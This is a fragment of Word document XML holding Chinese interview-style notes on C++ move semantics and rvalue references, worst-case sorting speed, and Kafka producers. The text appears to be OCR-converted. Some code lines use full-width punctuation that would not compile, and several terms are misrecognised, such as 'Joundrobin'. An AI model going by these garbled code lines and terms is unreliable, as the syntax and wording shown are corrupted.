      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>函数，我们可以这样实现：</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template^class T&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void swap(T&amp; a, T&amp; b)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="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660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T temp(std：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move(a));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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a = std:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move(b);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="720" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>b = std：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move(temp);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="64" w:name="bookmark70"/>
      <w:bookmarkEnd w:id="64"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>右值引用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="800" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为了支持移动操作，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>质标准引入了一种新的引用类型一右值引用。所谓右值引 用就是必须绑定到右值的引用。我们通过&amp;&amp;而不是&amp;来获得右值引用。如我们将要 看到的，右值引用有一个重要的性质一只能绑定到一个将要销毁的对象。因此，我 们可以自由地将一个右值引用的资源</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>“移动”到另</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一个对象中。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="800" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>—般而言，一个左值表达式表示的是一个对象的身份，而一个右值表达式表示的是 对象的值。</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>举例说明：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int i=42;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2470"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int &amp;r=i；</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TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>正确，工引用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2470"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int &amp;&amp;rr=i</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TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>错误，不能将一个右值引用绑定到一个左值上</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int &amp;r2=i*42; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>//错误，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i*42</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是一个右值</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">const int &amp;r3=i*42; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>//正确，我们可以将一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>const</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的引用绑定到一个右</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>值上</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int &amp;&amp;r2=i*42; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>//正确，将口2绑定到乘法结果上</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="65" w:name="bookmark71"/>
      <w:bookmarkEnd w:id="65"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>左值持久，右值短暫</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="285" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>左值有持久的状态，而右值要么是字面值常量，要么是表达式求值过程中创建的临 时对象。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>由于右值引用只能绑定到临时龙象，我们得知</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1560"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="66" w:name="bookmark72"/>
      <w:bookmarkEnd w:id="66"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>所引用的对象将要被销毁</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="67" w:name="bookmark73"/>
      <w:bookmarkEnd w:id="67"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>该对象没有其他用户</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="180" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="440"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这两个特征意味着：使用右值引用的代码可以自由地接管所引用的对象的资 源。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="600" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="68" w:name="bookmark74"/>
      <w:bookmarkStart w:id="69" w:name="bookmark75"/>
      <w:bookmarkStart w:id="70" w:name="bookmark76"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>11-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>哪种排序算法最坏情况下是最快的？冒泡，希尔，归并，快 速？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="68"/>
      <w:bookmarkEnd w:id="69"/>
      <w:bookmarkEnd w:id="70"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="180" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>归并</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="600" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="71" w:name="bookmark79"/>
      <w:bookmarkEnd w:id="71"/>
      <w:bookmarkStart w:id="72" w:name="bookmark77"/>
      <w:bookmarkStart w:id="73" w:name="bookmark78"/>
      <w:bookmarkStart w:id="74" w:name="bookmark80"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的生产者和消费者的理解</w:t>
      </w:r>
      <w:bookmarkEnd w:id="72"/>
      <w:bookmarkEnd w:id="73"/>
      <w:bookmarkEnd w:id="74"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>生产者:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Producer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>将消息发布到指定的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Topic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中，同时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Producer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">也能决定将此消息归属于哪个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>partition;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>比如基于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Joundrobin”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>方式或者通过其他的一些算</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>法等.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
